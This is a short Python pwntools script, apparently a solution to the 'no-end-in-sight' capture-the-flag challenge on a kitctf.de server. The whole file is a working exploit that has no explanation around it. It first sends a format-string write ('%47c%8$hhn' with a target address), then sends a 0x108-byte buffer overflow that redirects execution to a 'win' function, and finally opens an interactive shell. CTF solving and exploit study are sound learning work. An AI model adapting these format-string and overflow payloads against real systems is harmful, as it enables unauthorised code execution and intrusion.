#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("no-end-in-sight")


local = False 
if local:
    p = process("./no-end-in-sight")
    gdb.attach(p,'''b*0x00000000004011c8\nc''')
else:
    p = remote('no-end-in-sight-0.chals.kitctf.de', 1337, ssl=True)

elf = context.binary = ELF('./no-end-in-sight', checksec=False)

win = 0x0000000000401146
binsh = 0x404028
payload = b'%47c%8$hhn      ' + p64(binsh) 
p.sendline(payload)
sleep(1)
payload = b'a'*0x108 + p64(0x0000000000401147)
p.sendline(payload)

p.interactive()

